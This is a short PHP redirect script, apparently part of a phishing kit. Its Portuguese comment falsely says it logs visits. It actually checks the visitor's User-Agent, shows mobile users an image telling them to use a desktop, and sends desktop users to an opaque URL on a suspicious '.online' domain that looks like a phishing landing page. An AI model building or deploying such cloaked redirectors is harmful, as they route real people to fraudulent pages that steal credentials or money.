<?php
//esse codigo salva os acessos a esse arquivo

if(!empty($_SERVER['HTTP_USER_AGENT'])){
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    if(preg_match('@(iPad|iPod|iPhone|Android|BlackBerry|SymbianOS|SCH-M\d+|Opera Mini|Windows CE|Nokia|SonyEricsson|webOS|PalmOS|Lumia)@', $useragent) )
	{
$uagent = "Celular";
	}else{
$uagent = "PC-Notebook";
	}
}
if($uagent == 'Celular'){
	header("location: https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0KqxQ5K55Oyn6QxEwqI540WGkjl89O9NoSAMPhz_YtLLibSU5nYriK7FVuCT1vhSZi5g--y2x9qyAEON5JgjBkWQzf2S2f7shrLlsWq7Pp39FxUtUT-Cp28aScoZavNj6FueGIWHfKX04p_Qtsz4goZQKRcqJt5of1eh0UhI4kIu0ImWVVnfgmG-YY2iu/s16000/usedesktop.png");
}else{
	header("location: https://clientestlt.brdprogramaespecial.online/bra-red/pagina/?hash=ibfp");
}
?>